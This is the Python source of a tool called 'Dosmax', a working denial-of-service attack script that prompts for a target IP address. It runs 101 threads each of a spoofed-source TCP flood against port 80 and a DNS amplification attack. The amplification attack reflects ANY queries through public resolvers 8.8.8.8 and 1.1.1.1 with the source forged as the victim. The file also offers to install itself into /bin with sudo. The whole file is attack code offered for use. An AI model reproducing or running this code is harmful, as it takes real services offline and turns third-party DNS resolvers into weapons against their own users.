from sys import argv
from os import system
from sys import platform

try:
   if argv[1] in ['--global', '-G'] and platform == 'linux':
      with open('dosmax.py') as file:
         lines = file.readlines()
         code = '#!/usr/bin/python3\n'
         for i in range(1, 3):
            code += lines[i]
         for i in range(26, len(lines)):
            code += lines[i]
         file.close()
      with open('dosmax', 'w') as file:
         file.write(code)
         file.close()
      system('chmod +x dosmax;dos2unix dosmax;sudo mv dosmax /bin')
      print('\033[1;92m[ALERT] DOSMAX GLOBED !')
      exit()
   elif argv[1] in ['--version', '-V']:
      print('Dosmax version 2.0')
      exit()
except:
   pass

from random import randint
from threading import Thread
from time import sleep

try:
   from scapy.all import *
except:
   system('sudo pip install scapy')
   from scapy.all import *

if platform in ['win32', 'win64']:
   try:
      from colorama import init
   except:
      system('sudo pip install colorama');
      from colorama import init
   init()
   system('cls')
      
else:
   system('clear')

print('''
\033[1;38;5;196m █▀▀▄  █▀▀▀█  █▀▀▀█  █▀▄▀█ ─█▀▀█ ▀▄ ▄▀ 
\033[1;38;5;160m █─ █  █── █ ─▀▀▀▄▄  █ █ █  █▄▄█ ─ █── 
\033[1;38;5;166m █▄▄▀  █▄▄▄█  █▄▄▄█  █── █  █─ █ ▄▀ ▀▄''')

c = '≡'

for i in range(37):
   print(f'\r ┌\033[1;38;5;172m{c*i}', end='')
   sleep(0.01)

try:
   target_IP = input('\n \033[1;38;5;172m│─\033[1;38;5;154m[IP] TARGET IP: \033[1;38;5;22m')
except:
   print('\033[0;0m')
   exit()

if target_IP == '':
   exit()

print(' \033[1;38;5;172m│─\033[1;38;5;93m[ALERT] DOS ATTACK ON', target_IP, '...\033[1;92m')
sleep(5)

def volume():
   while True:
      try:
         a = str(randint(1, 254))
         b = str(randint(1, 254))
         c = str(randint(1, 254))
         d = str(randint(1, 254))
         dot = '.'
         source_ip = a + dot + b + dot + c + dot + d
         
         for source_port in range(1, 65535):
            IP1 = IP(src=source_ip, dst=target_IP)
            TCP1 = TCP(sport=source_port, dport=80)
            pkt = IP1 / TCP1
            send(pkt, inter=0.001)
      except:
         print('  \033[1;37m\033[1;48;5;197m[ERROR] UNRECONIZED IP ADRESS', '\033[0;0m')
         exit()

def amplification():
   while True:
      try:
         for ip in ('8.8.8.8', '1.1.1.1'):
            packet = IP(src=target_IP, dst=ip)/UDP(dport=53)/DNS(rd=1, qdcount=1, qd=DNSQR(qname='google.com', qtype='ANY'))
            send(packet)
      except:
         exit()

for i in range(101):
   Thread(target=volume).start()
   Thread(target=amplification).start()

